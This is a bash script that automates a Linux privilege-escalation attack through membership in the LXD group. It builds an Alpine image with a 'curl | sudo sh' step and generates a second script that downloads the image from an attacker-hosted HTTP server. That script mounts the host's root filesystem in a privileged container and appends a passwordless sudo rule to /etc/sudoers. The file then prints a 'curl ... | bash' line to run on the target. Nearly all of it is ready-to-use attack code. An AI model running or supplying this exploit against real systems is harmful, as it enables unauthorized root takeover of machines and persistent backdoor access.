#!/bin/bash

print_line(){
  echo -e "\n--------------------------------------------------------"
}

CURRENT_USER=$(id -un)
CURRENT_GROUP=$(id -gn)

LPORT=8000
netstat -lnt 2>/dev/null | grep "$LPORT"
while [ $? -eq 0 ]; do
  LPORT=$(python3 -c "print($LPORT+1)")
  netstat -lnt 2>/dev/null | grep "$LPORT"
done

HOSTS="$(ifconfig | grep "inet " | cut -d " " -f 10)"
print_line
echo "Enter one of this IPs: $(echo $HOSTS)"
read -ei "$(echo "$HOSTS" | grep "10.")" LHOST
print_line
echo "LHOST=$LHOST; LPORT=$LPORT"

echo "This script require root permition!"
curl -fsSL https://github.com/Seven7Up/alpine-builder/raw/master/build-alpine | sudo sh

sudo chown -R $CURRENT_USER:$CURRENT_GROUP .
mv lxd-alpine-*.tar.gz alpine.tar.gz

cat << EOF > lxd-exploit.sh
#!/bin/bash

CURRENT_USER=\$(id -un)
cd "\$(mktemp -d)"
echo "chmod 0640 /mnt/root/etc/sudoers && echo '\$CURRENT_USER ALL=(ALL) NOPASSWD: ALL' >> /mnt/root/etc/sudoers && chmod 0440 /mnt/root/etc/sudoers && exit" > /tmp/new-account.sh
curl -LO http://$LHOST:$LPORT/alpine.tar.gz

lxc image import alpine.tar.gz --alias alpine && lxd init --auto
echo -e "[*] Listing images...\n" && lxc image list
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash /mnt/root/tmp/new-account.sh

sudo -l
EOF

python3 -m http.server $LPORT &
echo "Run in the remote machine: 'curl -L http://$LHOST:$LPORT/lxd-exploit.sh | bash'"

# You can use this if you want to clean all python process
clean(){
  kill -9 $(netstat -lntp 2>/dev/null | grep "$1" | awk -e '{print $7}' | cut -d'/' -f1 | xargs)
}

sleep 120
echo "Wanna remove all confusing files? [y/n]"
# This read is like a waiting process, when you don't need python3 server more, you can enter 'y'
read YESORNO
if [ "$YESORNO" == "y" ]; then
  clean $LPORT
  rm -rf alpine.tar.gz docker-alpine-*.tar.gz Dockerfile lxd-exploit.sh
fi
